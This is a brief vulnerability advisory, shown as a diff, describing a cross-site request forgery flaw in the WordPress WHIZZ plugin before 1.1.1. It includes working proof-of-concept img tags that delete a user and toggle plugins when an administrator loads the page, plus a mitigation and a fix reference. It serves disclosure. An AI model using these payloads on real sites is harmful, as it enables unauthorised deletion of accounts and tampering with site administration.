@@ -1,0 +1,34 @@
+======
+Software: WordPress WHIZZ
+Version: <1.1.1
+Homepage: https://wordpress.org/plugins/whizz/
+=======
+
+Description
+================
+Get type CSRF in WordPress WHIZZ allows attackers to delete any wordpress users and change plugins status
+
+POC:
+========
+include in the page ,then attack will occur:
+
+delete user:
+
+<img src="http://127.0.0.1/wordpress/wp-admin/admin.php?page=users-list&uid=4&view=list_view&deletec=yes&list_of=all_users">
+
+
+active or disactive plugins:
+
+<img src="http://127.0.0.1/wordpress/wp-admin/admin.php?page=plugin-list&action=activatep&ppath=ag-custom-admin/plugin.php&view=list_view&list_of=">
+
+<img src="http://127.0.0.1/wordpress/wp-admin/admin.php?page=plugin-list&action=deactivatep&ppath=ag-custom-admin/plugin.php&view=list_view&list_of=">
+
+
+Mitigations
+================
+Disable the plugin until a new version is released that fixes this bug.
+
+
+FIX:
+==========
+https://wordpress.org/plugins/whizz/ 1.1.1 changelog->Specifically
